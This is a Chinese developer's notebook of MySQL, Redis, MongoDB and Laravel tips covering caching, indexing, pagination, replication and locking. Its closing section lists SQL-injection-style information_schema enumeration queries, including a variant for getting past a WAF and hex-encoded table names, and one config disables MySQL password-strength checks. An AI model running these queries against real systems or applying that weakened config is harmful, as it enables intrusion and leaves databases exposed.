在线程B更新数据库成功后、更新缓存成功之前读取到数据，也就是读取到了缓存的旧数据。该策略比较适合更新的频次比较少的场景下，比如博客的文章、基础数据、个人信息等场景。先更新数据库再删除缓存数据脏读一个请求处理中过程中，倘若数据库更新成功了但是缓存更新失败了，那么后面的请求读取的数据都是旧数据、则脏数据。可以通过缓存过期时间定义缓存的有效期(推荐)，或者使用消息队列在删除缓存失败的时候再次异步更新缓存，直到成功为止，这两种方案都是尽可能减少读取脏数据的方案，还有一种方案可以完全解决数据脏读，就是异步请求串行化，一个字锁，但是会增加业务处理的时间甚至会出现死锁的情况。这种缓存操作的策略使用的情况被使用的比较多、使用的场景也比较广泛。先删除缓存再更新数据库数据脏读与第二种情况类似，但是更容易出现数据脏读，比如：删除缓存失败更新数据库成功(一般的业务可能在缓存修改失败后不再进行数据库的更新了)、线程B读取了线程A已经成功删除了缓存后更新数据库之前读取了脏数据并且也导致缓存的数据也是旧数据。解决方案还是使用缓存过期时间或者消息队列，在缓存过期的时候务必要注意雪崩的问题，比如大批量数据的过期时间几乎集中在同一个时间点上，容易造成雪崩。VARCHAR(N) 中的 N 代表的是字符数，而不是字节数。使用 UTF8 存储 255 个汉字 Varchar(255)=765 个字节。过大的长度会消耗更多的内存 优先选择符合存储需要的最小的数据类型 方法 1、将字符串转换成数字类型存储，如：将IP地址转换成整形数据。 MySQL 提供了两个方法来处理 IP 地址 inet_aton 把ip转为无符号整型(4-8位) inet_ntoa 把整型的ip转为地址 插入数据前，先用 inet_aton 把 IP 地址转为整型，可以节省空间。显示数据时，使用 inet_ntoa 把整型的 IP 地址转为地址显示即可。 2、对于非负型的数据（如自增 ID、整型 IP）来说，要优先使用无符号整型来存储,因为无符号相对于有符号可以多出一倍的存储空间。 SIGNED INT -2147483648~2147483647 UNSIGNED INT 0~4294967295 同财务相关的金额类数据必须使用 decimal 类型 非精准浮点：float，double 精准浮点：decimal Decimal 类型为精准浮点数，在计算时不会丢失精度。占用空间由定义的宽度决定，每 4 个字节可以存储 9 位数字，并且小数点要占用一个字节。可用于存储比 bigint 更大的整型数据。 避免数据类型的隐式转换 隐式转换会导致索引失效。如： select name,phone from customer where id = '111'; https://learnku.com/articles/25020#topnav MongoDB读写分离PHP7中的MongoDB\Driver\ReadPreference MongoDB读写分离（Read Preference）的几种模式 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697const integer RP_PRIMARY = 1 ;const integer RP_PRIMARY_PREFERRED = 5 ;const integer RP_SECONDARY = 2 ;const integer RP_SECONDARY_PREFERRED = 6 ;const integer RP_NEAREST = 10 ;primary主节点，默认模式，读操作只在主节点，如果主节点不可用，报错或者抛出异常。primaryPreferred首选主节点，大多情况下读操作在主节点，如果主节点不可用，如故障转移，读操作在从节点。secondary从节点，读操作只在从节点， 如果从节点不可用，报错或者抛出异常。secondaryPreferred首选从节点，大多情况下读操作在从节点，特殊情况（如单主节点架构）读操作在主节点。nearest最邻近节点，读操作在最邻近的成员，可能是主节点或者从节点在使用mongo副本集的时候就在想，这些副本不用来读太浪费了，再翻阅php的mongodb驱动，发现一个美好的readPreference，可以设定读取的优先级，其中就有优先读取副本，甚至还可以设定读取最小网络延迟的节点，具体可以参考：http://php.net/manual/zh/mongodb-driver-readpreference.construct.phphttp://imhuchao.com/918.html写入安全级别的使用W选项0：非确认式写入1：确认式写入说明：这个级别下，对副本级只对主库做确认写入2：副本级确认式写入说明：这个级别下，副本集第一个slave写入成功后就响应给clientmajority：复制级更多slave写入成功后，在响应给client$filter = array();$options = array( /* Only return the following fields in the matching documents */ "projection" =&gt; array( "title" =&gt; 1, "article" =&gt; 1, ), "sort" =&gt; array( "views" =&gt; -1, ), "modifiers" =&gt; array( '$comment' =&gt; "This is a query comment", '$maxTimeMS' =&gt; 100, ),);$query = new MongoDB\Driver\Query($filter, $options);$manager = new MongoDB\Driver\Manager("mongodb://localhost:27017");$readPreference = new MongoDB\Driver\ReadPreference(MongoDB\Driver\ReadPreference::RP_PRIMARY);$cursor = $manager-&gt;executeQuery("databaseName.collectionName", $query, $readPreference);foreach($cursor as $document) &#123; var_dump($document);&#125;vi config/database.php"mongodb" =&gt; [ 'driver' =&gt; 'mongodb', 'host' =&gt; env('MONGO_DEFAULT_HOST', '172.1.7.21'), 'port' =&gt; env('MONGO_DEFAULT_PORT', 27017), 'database' =&gt; env('MONGO_DEFAULT_DATABASE', 'app'), 'username' =&gt; env('MONGO_DEFAULT_USER', ''), 'password' =&gt; env('MONGO_DEFAULT_PASSWORD', ''), 'options' =&gt; [ 'replicaSet' =&gt; env('MONGO_DEFAULT_REPLICASET'), 'readPreference'=&gt; env('MONGO_READ_PREFERENCE', 'nearest'), ] ],vi /vendor/jenssegers/mongodb/src/Jenssegers/Mongodb/Connection.php:28public function __construct(array $config) &#123; $this-&gt;config = $config; // Build the connection string $dsn = $this-&gt;getDsn($config); // You can pass options directly to the MongoClient constructor $options = array_get($config, 'options', []); // Create the connection $this-&gt;connection = $this-&gt;createConnection($dsn, $config, $options); dd($this-&gt;connection-&gt;getReadPreference()); array:1 [▼ "type" =&gt; "nearest" ] // Select database $this-&gt;db = $this-&gt;connection-&gt;&#123;$config['database']&#125;; $this-&gt;useDefaultPostProcessor(); &#125; Laravel 分组获取最新记录123456789101112131415161718///https://learnku.com/articles/20626select * from (select * from project where user_id = :user_id order by id desc) as a group by a.name order by id desc;select * from (select * from project where user_id = :user_id order by id desc limit 10000) as a group by a.name order by id desc;public function projectList(Request $request)&#123; $limit = $request-&gt;get('limit',10); $user_id = $request-&gt;get('user_id',null); $sub_query = Project::where('user_id',$user_id)-&gt;orderBy('id','desc')-&gt;limit(1000);//子查询 $results = Project::select('*') -&gt;from(DB::raw('('.$sub_query-&gt;toSql().') as a')) //from() 类似与 DB::table(), toSql()得到带 ? 号的执行 sql 语句 -&gt;mergeBindings($sub_query-&gt;getQuery())//mergeBindings() 合并绑定参数,getQuery()获得具体值 -&gt;groupBy('name') -&gt;orderBy('id','desc') -&gt;paginate($limit); return $this-&gt;pageDate($results); &#125; 将分组无结果的记录显示为01234567891011121314151617181920212223242526272829303132333435http://hshine.net/article/12 SELECT ISNULL( SUM ( u_table1917.field5 ), 0 ) As val, u_table1916.companycode FROM u_table1917 JOIN u_table1916 ON u_table1917.field3= u_table1916.field6 WHERE u_table1916.field3 LIKE '2018%' AND u_table1916.companycode IN ( 'GY00051', 'GY00071', 'GY00072', 'GY00073' ) GROUP BY u_table1916.companycode SELECT DISTINCT Ma.companycode,ISNULL(Sub.val,0) FROM --此处使用ISNULL对结果进行判空处理 ( SELECT u_table1916.companycode FROM u_table1917 JOIN u_table1916 ON u_table1917.field3= u_table1916.field6 --此处使用LEFT JOIN 关联，因为左表是包括所有数据记录的，而右表只包括符合条件的，这样就能获得 --将所有的结果来进行分组，再加上ISNULL的处理，就可以显示聚合为0的记录 ) AS Ma LEFT JOIN ( SELECT SUM ( u_table1917.field5 ) As val, u_table1916.companycode FROM u_table1917 JOIN u_table1916 ON u_table1917.field3= u_table1916.field6 WHERE u_table1916.field3 LIKE '2018%' GROUP BY u_table1916.companycode ) AS Sub ON Ma.companycode=Sub.companycode MISCONF Redis is configured to save RDB snapshots1234567891011121314151617181920使用redis-cli，你可以这样做： CONFIG SET dir /tmp/some/directory/other/than/varCONFIG SET dbfilename temp.rdb千万不要使用https://blog.yiranzai.cn/posts/901/ config set stop-writes-on-bgsave-error no忽视这些错误并不是解决问题的办法。我的解决方案是修改配置文件，重启服务 $ mkdir /usr/local/redis/db$ vim redis.conf# 第263行左右 设置快照文件目录，切勿设置成一个redis用户没有权限的目录dir /usr/local/redis/db/$ chown -R redis:redis /usr/local/redis MySQL数据库主从复制123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657$ systemctl start mysqld.service$ firewall-cmd --zone=public --add-port=80/tcp --permanent$ firewall-cmd --reloadmaster服务器配置：https://blog.yiranzai.cn/posts/5420/$ vim /etc/my.cnf[mysqld]server-id=1log-bin=mysql-bin # 启用二进制日志slave服务器配置：$ vim /etc/my.cnf[mysqld]log_bin = mysql-binserver_id = 2relay_log = mysql-relay-binlog_slave_updates = 1read_only = 1slave-skip-errors = all #忽略因复制出现的所有错误systemctl restart mysqld.servicemysql&gt; MySQL -u root -pmysql&gt; GRANT REPLICATION SLAVE ON *.* to 'user'@'192.168.0.124' identified by 'password';mysql&gt; FLUSH PRIVILEGES;mysql&gt; FLUSH TABLES WITH READ LOCK;mysql&gt; show master status;mysql&gt; UNLOCK TABLES;mysql&gt; show maser status;+------------------+----------+--------------+------------------+-------------------+| File | Position | Binlog_Do_DB | Binlog_Ignore_DB | Executed_Gtid_Set |+------------------+----------+--------------+------------------+-------------------+| mysql-bin.000004 | 24364 | | | |+------------------+----------+--------------+------------------+-------------------+1 row in set (0.02 sec)mysql&gt; change master to -&gt; master_host='192.168.0.123', -&gt; master_user='user', -&gt; master_password='password', -&gt; master_log_file='mysql-bin.000004', -&gt; master_log_pos=24364;mysql&gt; start slave;mysql&gt; show slave status \G;*************************** 1. row *************************** Slave_IO_State: Waiting for master to send event Master_Host: 192.169.0.123 Master_User: user Master_Port: 3306 Connect_Retry: 60 Master_Log_File: mysql-bin.000004 Read_Master_Log_Pos: 24364 Relay_Log_File: mysql-relay-bin.000292 Relay_Log_Pos: 283 Relay_Master_Log_File: mysql-bin.000004 Slave_IO_Running: Yes Slave_SQL_Running: Yes... Redis 快速实现签到统计12345678910111213https://learnku.com/articles/25181在你想要的位置操作字节值，比如说用户 3 在 3月13号 签到了，那么 setbit(20190313, 3 ,1) 就可以实现签到功能了，这里的 offset 就是3 $dayKey = 'login:'.\date('Ymd',\time());$redis-&gt;bitop('AND', 'threeAnd', 'login:20190311', 'login:20190312', 'login:20190313');echo "连续三天都签到的用户数量：" . $redis-&gt;bitCount('threeAnd');$redis-&gt;bitop('OR', 'threeOr', 'login:20190311', 'login:20190312', 'login:20190313');echo "三天中签到用户数量（有一天签也算签了）：" . $redis-&gt;bitCount('threeOr');$redis-&gt;bitop('AND', 'monthActivities'', $redis-&gt;keys('login:201903*'));echo "连续一个月签到用户数量：" . $redis-&gt;bitCount('monthActivities');echo "当前用户指定天数是否签到：" . $redis-&gt;getbit('login:20190311', $this-&gt;user-&gt;id); MySQL分组查询TOP N的实践和踩坑1234567891011121314151617181920212223242526272829303132333435363738https://blog.yiranzai.cn/posts/991/ 三个字段 课程 学生 成绩，如何取每门课程成绩 top3 的学生CREATE TABLE `test2` ( `id` int(11) NOT NULL AUTO_INCREMENT, `name` varchar(20) DEFAULT NULL, `course` varchar(20) DEFAULT NULL, `score` int(11) DEFAULT NULL, PRIMARY KEY (`id`), KEY `course` (`course`,`score`) USING BTREE) ENGINE=InnoDB AUTO_INCREMENT=1 DEFAULT CHARSET=utf8mb4;ysql&gt; INSERT INTO `test2`(name,course,score) VALUES('a1', 'a', 50),('a2', 'a', 50),('a3', 'a', 50),('a4', 'a', 40),('a5', 'a', 40),('a6', 'a', 40),('a7', 'a', 30),('a8', 'a', 30),('a9', 'a', 30);mysql&gt; select * from test2;+----+------+--------+-------+| id | name | course | score |+----+------+--------+-------+| 1 | a1 | a | 50 || 2 | a2 | a | 50 || 3 | a3 | a | 50 || 4 | a4 | a | 40 || 5 | a5 | a | 40 || 6 | a6 | a | 40 || 7 | a7 | a | 30 || 8 | a8 | a | 30 || 9 | a9 | a | 30 |+----+------+--------+-------+9 rows in set (0.06 sec)select *from test1 awhere 3&gt;(select count(*) from test1 where course=a.course and score&gt;a.score)order by a.course,a.score desc; case when12345678910111213141516171819202122232425262728SELECT CASE WHEN user_sleep_time &lt;= 1536595176 AND user_sleep_time &gt; 1535212776 THEN 'twoWeekdsAgo' WHEN user_sleep_time &lt;= 1535212776 AND user_sleep_time &gt; 1532620776 THEN 'thirtyDaysAgo' WHEN user_sleep_time &lt;= 1532620776 AND user_sleep_time &gt; 1530028776 THEN 'sixtyDaysAgo' WHEN user_sleep_time &lt;= 1530028776 AND user_sleep_time &gt; 1527436776 THEN 'ninetyDaysAgo' WHEN user_sleep_time &lt;= 1527436776 AND user_sleep_time &gt; 1524844776 THEN 'oneHundredAndTwentyDaysAgo' WHEN user_sleep_time &lt;= 1524844776 AND user_sleep_time &gt; 1522252776 THEN 'oneHundredAndFiftyDaysAgo' WHEN user_sleep_time &lt;= 1522252776 THEN 'oneHundredAndEightyDaysAgo' ELSE 0 END sleep, COUNT(*) AS userCountFROM `user_sleep_relation`WHERE `user_recall_time` &lt; 1536595176GROUP BY `sleep` https://learnku.com/articles/17547 mysql replace into 坑123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657replace into执行的逻辑1、遇到PRIMARY KEY或UNIQUE索引的，新记录与旧记录有冲突的（这里实际产生了异常duplicate key error），会把旧记录删除，然后再插入新记录2、若是新记录没有冲突，就直接插入一条新记录，与insert into一样 看起来很正常，这里针对第一种逻辑会有问题https://jjhpeopl.iteye.com/blog/2368927 https://blog.xupeng.me/2013/10/11/mysql-replace-into-trap/1、把旧记录删除之后，插入的新记录只是插入了那些指定的字段，原本不想更新的字段，直接为默认值了，会导致数据丢失2、若旧记录的id跟其他表是有关联的，更新后新记录会产生新的id，导致这种关联丢失3、而且使用replace into会导致自增主键id一直增大，很容易导致id值范围不够用另外，若是数据库存在主从关系，在主机器上进行了replace into操作之后，从机器上对应表的AUTO_INCREMENT是不会更新的，导致从机器转为主机器时，新插入数据会出现异常，直到AUTO_INCREMENT增加到原来主机器的值为止。 CREATE TABLE `auto` ( `id` int(10) unsigned NOT NULL AUTO_INCREMENT, `k` int(10) unsigned NOT NULL, `v` varchar(100) DEFAULT NULL, `extra` varchar(200) DEFAULT NULL, PRIMARY KEY (`id`), UNIQUE KEY `uk_k` (`k`)) ENGINE=InnoDB DEFAULT CHARSET=latin1INSERT INTO auto (k, v, extra) VALUES (1, '1', 'extra 1'), (2, '2', 'extra 2'), (3, '3', 'extra 3');Query OK, 3 rows affected (0.01 sec)Records: 3 Duplicates: 0 Warnings: 0xupeng@diggle7:3600(dba_m) [dba] mysql&gt; SHOW CREATE TABLE auto\G*************************** 1. row *************************** Table: autoCreate Table: CREATE TABLE `auto` ( `id` int(10) unsigned NOT NULL AUTO_INCREMENT, `k` int(10) unsigned NOT NULL, `v` varchar(100) DEFAULT NULL, `extra` varchar(200) DEFAULT NULL, PRIMARY KEY (`id`), UNIQUE KEY `uk_k` (`k`)) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=latin11 row in set (0.01 sec)xupeng@diggle7:3600(dba_m) [dba] mysql&gt; SELECT * FROM auto;+----+---+------+---------+| id | k | v | extra |+----+---+------+---------+| 1 | 1 | 1 | extra 1 || 2 | 2 | 2 | extra 2 || 3 | 3 | 3 | extra 3 |+----+---+------+---------+3 rows in set (0.00 sec)REPLACE INTO auto (k, v) VALUES (1, '1-1');SELECT * FROM auto;+----+---+------+---------+| id | k | v | extra |+----+---+------+---------+| 2 | 2 | 2 | extra 2 || 3 | 3 | 3 | extra 3 || 4 | 1 | 1-1 | NULL |+----+---+------+---------+3 rows in set (0.00 sec)执行完 REPLACE INTO auto (k, v) VALUES (1, ‘1-1’) 之后，由于新写入记录时并未给 extra 字段指定值，原记录 extra 字段的值就「丢失」了，而通常这并非是业务上所预期的，更常见的需求实际上是，当存在 k=1 的记录时，就把 v 字段的值更新为 ‘1-1’，其他未指定的字段则保持原状，而满足这一需求的 MySQL 方言是 INSERT INTO auto (k, v) VALUES (1, ‘1-1’) ON DUPLICATE KEY UPDATE v=VALUES(v);鉴于此，很多使用 REPLACE INTO 的场景，实际上需要的是 INSERT INTO … ON DUPLICATE KEY UPDATE，在正确理解 REPLACE INTO 行为和副作用的前提下，谨慎使用 REPLACE INTO。 类型转换对 MySQL 选择索引的影响123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051mysql [localhost] &#123;msandbox&#125; (test) &gt; explain select age from -&gt; indextest where name=111222\G*************************** 1. row *************************** id: 1 select_type: SIMPLE table: indextest type: ALLpossible_keys: idx_name key: NULL key_len: NULL ref: NULL rows: 4 Extra: Using where1 row in set (0.00 sec)https://blog.xupeng.me/2012/02/08/type-conversion-and-index-selection-of-mysql/mysql [localhost] &#123;msandbox&#125; (test) &gt; SELECT '18015376320243459' = -&gt; 18015376320243459;+-----------------------------------------+| '18015376320243459' = 18015376320243459 |+-----------------------------------------+| 0 |+-----------------------------------------+1 row in set (0.00 sec)mysql [localhost] &#123;msandbox&#125; (test) &gt; SELECT '18015376320243459' + 0;+-------------------------+| '18015376320243459' + 0 |+-------------------------+| 1.80153763202435e+16 |+-------------------------+1 row in set (0.00 sec)mysql [localhost] &#123;msandbox&#125; (test) &gt; SELECT -&gt; cast('18015376320243459' as unsigned) = 18015376320243459;+-----------------------------------------------------------+| cast('18015376320243459' as unsigned) = 18015376320243459 |+-----------------------------------------------------------+| 1 |+-----------------------------------------------------------+1 row in set (0.00 sec)因为浮点数精度(53 bits)问题，并且 MySQL 将字符串转换为浮点数和将整数转换为浮点数使用不同的方法，字符串 '18015376320243459' 和整数 18015376320243459 相比较就不相等，如果要避免隐式浮点数转换带来的精度问题，可以显式地使用 cast 做类型转换，将字符串转换为整数。按照这些规则，对于上面的例子来说，name 字段的值和查询参数 '111222' 都会被转换为浮点数才会做比较，而很多文本都能转换为和 111222 相等的数值，比如 '111222', '111222aabb', ' 111222' 和 '11122.2e1'，所以 MySQL 不能有效使用索引，就退化为索引扫描甚至是全表扫描。反过来，如果使用一个字符串作为查询参数，对一个数字字段做比较查询，MySQL 则是可以有效利用索引的MySQL 可以将查询参数 '30' 转换为确定的数值 30，之后可以快速地在索引中找到与之相等的数值 explain select * from -&gt; indextest where date(create_time)='2012-02-02'\Gexplain select * from -&gt; indextest where create_time between '2012-02-02' and '2012-02-03'\G redis keys scan123456789101112131415161718192021222324252627282930$redis-&gt;keys('login:201903*')$redis-&gt;bitop('AND', 'monthActivities'', $redis-&gt;keys('login:201903*'));echo "连续一个月签到用户数量：" . $redis-&gt;bitCount('monthActivities');https://learnku.com/articles/25892当前的 keys 指令执行完了才可以继续，再加上 keys 操作是遍历算法，复杂度是 O(n)，乍一想就知道问题所在了，当实例中数据量过大的时候，Redis 服务可能会卡顿，其余指令可能会延时甚至超时报错..127.0.0.1:6379&gt; setbit login:20190321 1 1(integer) 0127.0.0.1:6379&gt; setbit login:20190321 2 1(integer) 0127.0.0.1:6379&gt; setbit login:20190322 2 1(integer) 0127.0.0.1:6379&gt; setbit login:20190323 2 1(integer) 0127.0.0.1:6379&gt; keys login:201903*1) "login:20190323"2) "login:20190322"3) "login:20190321"127.0.0.1:6379&gt; scan 0 match login:201903*1) "3"2) 1) "login:20190323" 2) "login:20190322"127.0.0.1:6379&gt; scan 0 match login:201903* count 21) "4"2) (empty list or set)127.0.0.1:6379&gt; scan 0 match login:201903* count 201) "0"2) 1) "login:20190323" 2) "login:20190322" 3) "login:20190321" mysql5.7Incorrect datetime value: ‘0000-00-00 00:00:00’ for column123456789101112`created_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00', `updated_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',show variables like 'sql_m%';sql_mode | ONLY_FULL_GROUP_BY,STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION alter table test modify created_at datetime NOT NULL;alter table test modify updated_at timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP;5.7 timestamp类型取值范围：1970-01-01 00:00:00 到 2037-12-31 23:59:59，初始值调整为 1970-01-02 00:00:00 就可以了 alter table test modify created_at timestamp NOT NULL DEFAULT '1970-01-02 00:00:00';alter table test modify updated_at timestamp NOT NULL DEFAULT '1970-01-02 00:00:00'; mysql的limit进行分页时出现重复12345678910111213141516171819202122select * from table order by xx limit 0,10当xx不存在索引，且有xx相同的行是，可能出现分页数据重复问题解决办法： 1.加上索引排序 select * from table order by xx,id（任意有索引的字段） limit 0,10 2、给xx字段加上索引 作为验证，您可以在这个字段上加索引 alter table tea_course_sort add index(course_sort_order)，然后由于这个表数目太小，以防加索引都未必能用得上，语句修改为 select * from tea_course_sort force index(course_sort_order) order by tea_course_sort.course_sort_order desc limit 0,10;来得到您预期的结果 select * from table_1 where 1=1 limit m,n这样后面的页可能会出现重复数据，这时可以通过加入order by 子句来解决这种情况， select * from table_1 where 1=1 order by field_1 limit m,n但是这里需要特别注意，如果field_1字段有相同值的情况下，后面的页还是会出现重复数据，这时可以加入第二个排序字段（值唯一），可以选主键id,对应的sql语句是select * from table_1 where 1=1 order by field_1 , id limit m,n但是最好保证field_1在表中的值是唯一的，这样就可以少写一个排序字段，增加查询效率，因为在只有一个排序字段的情况下，mysql会使用索引，如果是有多个排序字段的话，mysql会放弃索引做全表扫描。 预估 Mysql 数据表的数据大小和索引大小1234567SELECT data_length,index_lengthFROM information_schema.TABLES tWHERE table_schema='your_db_name'AND table_name = 'your_table_name';直接查询 avg_row_length 字段，这个字段表示数据表的平均行大小，和上面自己计算的结果类似。SHOW COLUMNS FROM TABLES;https://www.playpi.org/2019041001.html mysql limit查询优化方法123456789101112131415对同一张表在不同的地方取10条数据： 1）offset比较小时 代码示例: select * from user limit 10,10; 这条sql语句多次运行，时间保持在0.0004-0.0005之间。 代码示例: select * from user where uid &gt;=( select uid from user order by uid limit 10,1 ) limit 10; 这条sql语句多次运行，时间保持在0.0005-0.0006之间，主要是0.0006。 结论：偏移offset较小时，直接使用limit较优。这个显然是子查询的原因。 2）offset大时 代码示例: select * from user limit 10000,10; 这条sql语句多次运行，时间保持在0.0187左右 代码示例: select * from user where uid &gt;=( select uid from user order by uid limit 10000,1 ) limit 10; 这条sql语句多次运行，时间保持在0.0061左右，只有前者的1/3。可以预计offset越大，后者越优。 通过以上对比，得出mysql limit查询语句优化经验： 使用limit语句时，当数据量偏移量较小时可以直接使用limit，当数据量偏移量较大时，可以适当的使用子查询来做相关的性能优化。--------------------- select * from test a inner join (select id from test where val=4 limit 300000,5) b on a.id=b.id; FOUND_ROWS()12345678910111213141516171819202122分页程序一般由两条SQL组成：SELECT COUNT(*) FROM ... WHERE ....SELECT ... FROM ... WHERE LIMIT ...如果使用SQL_CALC_FOUND_ROWS的话，一条SQL就可以了：SELECT SQL_CALC_FOUND_ROWS ... FROM ... WHERE LIMIT ... 当我们在处理分页程序的时候，会使用 limit 来限制返回的数量，然后会有两种获取分页的方法：第一种方法：在 SELECT 语句中加入 SQL_CALC_FOUND_ROWS 选项，然后通过 SELECT FOUND_ROWS() 来获取总行数：SELECT SQL_CALC_FOUND_ROWS * FROM table WHERE id &gt; 100 LIMIT 10;SELECT FOUND_ROWS();第二种方式：使用正常的 SQL 语句，然后再用 SELECT COUNT(*) 来获取总行数：SELECT * FROM table WHERE id &gt; 100 LIMIT 10;SELECT COUNT(*) FROM table WHERE id &gt; 100;经过测试，一般来说 SQL_CALC_FOUND_ROWS 是比较慢的，SQL执行的时间甚至会达到10倍那么夸张，所以最好别使用 MySQL 的 SQL_CALC_FOUND_ROWS 来获取总行数 left join on where1234567891011121314151617使用了 left join，where 是针对左表，但左表是日期表，那如何做业务表上的条件限制数据库在通过连接两张或多张表来返回记录时，都会生成一张中间的临时表，然后再将这张临时表返回给用户；where 条件是在临时表生成好后，再对临时表进行过滤的条件；因此：where 条件加上，已经没有 left join 的含义（必须返回左边表的记录）了，条件不为真的就全部过滤掉。解决方案是把限制条件放在 on 后面select a.*,b.*from table1 aleft join table2 b on b.X=a.X and XXX结论：https://learnku.com/articles/26796 where 后面：是先连接然生成临时查询结果，然后再筛选on 后面：先根据条件过滤筛选，再连 生成临时查询结果 如何索引 JSON 字段1234567891011121314151617181920212223242526272829CREATE TABLE `players` ( `id` INT UNSIGNED NOT NULL, `player_and_games` JSON NOT NULL, `names_virtual` VARCHAR(20) GENERATED ALWAYS AS (`player_and_games` -&gt;&gt; '$.name') NOT NULL, PRIMARY KEY (`id`));SELECT * FROM `players`;https://learnku.com/articles/27046#topnav+----+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+| id | player_and_games | names_virtual |+----+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+| 1 | &#123;"id": 1, "name": "Sally", "games_played": &#123;"Puzzler": &#123;"time": 7&#125;, "Battlefield": &#123;"rank": "Sergeant V", "level": 20, "weapon": "sniper rifle"&#125;, "Crazy Tennis": &#123;"won": 4, "lost": 1&#125;&#125;&#125; | Sally || 2 | &#123;"id": 2, "name": "Thom", "games_played": &#123;"Puzzler": &#123;"time": 25&#125;, "Battlefield": &#123;"rank": "Major General VIII", "level": 127, "weapon": "carbine"&#125;, "Crazy Tennis": &#123;"won": 10, "lost": 30&#125;&#125;&#125; | Thom |CREATE INDEX `names_idx` ON `players`(`names_virtual`); EXPLAIN SELECT * FROM `players` WHERE `names_virtual` = "Sally"\G *************************** 1. row *************************** id: 1 select_type: SIMPLE table: players partitions: NULL type: refpossible_keys: names_idx key: names_idx key_len: 22 ref: const rows: 1 filtered: 100.00 Extra: NULL length 检测 vachar 字节长度12345678insert into test value (1, '测')SELECT id, LENGTH(str), CHAR_LENGTH(str) FROM test;返回结果是 1 3 1ALTER TABLE `test`ADD COLUMN `str2` varchar(2000) NULL AFTER `str`;SELECT id, LENGTH(str2), CHAR_LENGTH(str2) FROM test where id = 2;添加了一个 str2 字段，然后插入 256 个汉字，返回结果是2 768 256mysql lenght 是字符串所占的字节，并没有计算额外的所需字节。https://learnku.com/laravel/t/27848 浅析乐观锁与悲观锁12345678910111213141516171819202122232425262728293031323334使用悲观锁https://learnku.com/articles/27880悲观并发控制实际上是 “先取锁，再访问” 的保守策略，为数据处理的安全提供了保证。begin;select quantity from products where id = 1 for update;update products set quanntity = 2 where id = 1;commit;以上，对 id 为 1 的产品进行修改，先通过 for update 的方式进行加锁，然后再修改。典型的悲观锁策略。在对数据修改前，尝试增加排他锁。加锁失败，意味着数据正在被修改，进行等待或者抛出异常。加锁成功，对数据进行修改，提交事务，锁释放。如果我们加锁成功，有其他线程对该数据进操作或者加排他锁的操作，只能等待或者抛出异常。如果修改库存的逻辑发生并发，同一时间只有一个线程可以开启事务并获得 id = 1 的锁，其他事务必须等本次提交之后才能执行，这样可以保证数据不被其他事务修改。使用排他锁会把数据锁住，不过需要注意一些基本的锁级别，MySQL InnoDB 默认行级锁。行级锁是基于索引的，如果一条 SQL 语句用不到索引是不会使用行级锁，会使用表级锁把整张表锁住。使用乐观锁select quantity from products where id = 1update products set quantity = 2 where id = 1 and quantity = 3先查询库存表当前库存数，然后更新的时候判断数据表对应数据的 quantity 与第一次取出来的是否一致，一致则更新，否则认为是过期数据。这样实现有一个问题，线程 1 从数据库取出 quantity 为 3，线程 2 也取出同一条数据的 quantity，进行操作，变成了 2，然后又进行某些操作 变成了 3，此时线程 1 进行更新操作成功。但是这个过程有问题。引入 version 参数，乐观锁每次在执行数据修改的操作，都会带上版本号，一旦版本号和数据的版本号一致就可以执行修改操作并对 version 执行 +1 操作，否则就执行失败。这样实现也有一个问题，如果真的有高并发的时候，就只有一个线程可以修改成功，就会存在大量的失败。如果你的应用存在超高并发，这样解决也不好，因为会总让用户感知到失败。尝试减小乐观锁力度，最大程度提高吞吐。update products set quantity = quantity - 1 where id = 1 and quanntity - 1 &gt; 0使用这条 SQL 语句，在执行过程中，会在一次原子操作中查询一遍 quantity 的值，并且减去 1。laravel 悲观锁对应 lockForUpdate，乐观锁对应 sharedLock https://learnku.com/docs/laravel/5.8/queries/3926 mysql 8.0 使用简单密码123456789101112131415161718直接在 my.cnf 配置文件中 [mysqld] 部分加入下面参数，然后重启 mysqld 即可。validate_password.policy = 0validate_password.mixed_case_count = 0validate_password.number_count = 0validate_password.special_char_count = 0validate_password.length = 0validate_password.policy可以配置密码的复杂度，可以配置的级别：0 or LOW1 or MEDIUM2 or STRONGvalidate_password.length最终密码的长度，允许为 0 ，但是要注意这里有个坑，validate_password.length 的长度要大于 validate_password.mixed_case_count + validate_password.number_count + validate_password.special_char_count 的和。 例如默认这 3 个 参数的长度都是 1， 所以密码长度最小也只能是 4， 即使配置成了 1 或者 0 ，最终它也会自动变成 4 。 要是想使用 0 的长度，需要将另外三个参数也配置成 0 。https://broqiang.com/posts/mysql-8-0-uses-a-simple-password Mysql 批量更新多行1234567update test set test.sex = case name when '小白' then 2 when '小红' then 2 else 11 endwhere name in ('小白','小红') and test.group = 1https://www.h57.pw/2016/09/11/mysql-batch-update-multiline-notes/ MySQL中的注释符# 注释从#字符到行尾 -- 注释从–序列到行尾，后面需要跟上一个或多个空格，tab也可以 /* */ 注释中间的字符 获取元数据1234567891011121314151617181920212223242526272829303132 获取当前的数据库用户，数据库名称，数据库的版本信息select user(),database(),version() from dual;# 查询数据库，有时需要限制返回的数量，或者偏移，例如页面只显示一条数据的情况 limit 0,1 limit 1,2# 需要通过偏移来返回所有的数据库select schema_name from information_schema.schemata;# group_concat 函数是将多行数据连接成一行select group_concat(schema_name) from information_schema.schemata;# 查询表# 方法1select group_concat(table_name) from information_schema.tables where table_schema=database(); # 方法2select table_name from information_schema.tables where table_schema='database_name';# 方法3select table_name from information_schema.tables where table_schema=(select database());# 查询列select column_name from information_schema.columns where table_schema='database_name' and table_name='users';select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='flag';# 上面可能会被waf识别，也可以这样select group_concat(column_name) from information_schema.columns where table_name='users';# 字符串可以转换成16进制select concat(group_concat(distinct+column_name)) from information_schema.columns where table_name=0x696e666f;``` ### max key length is 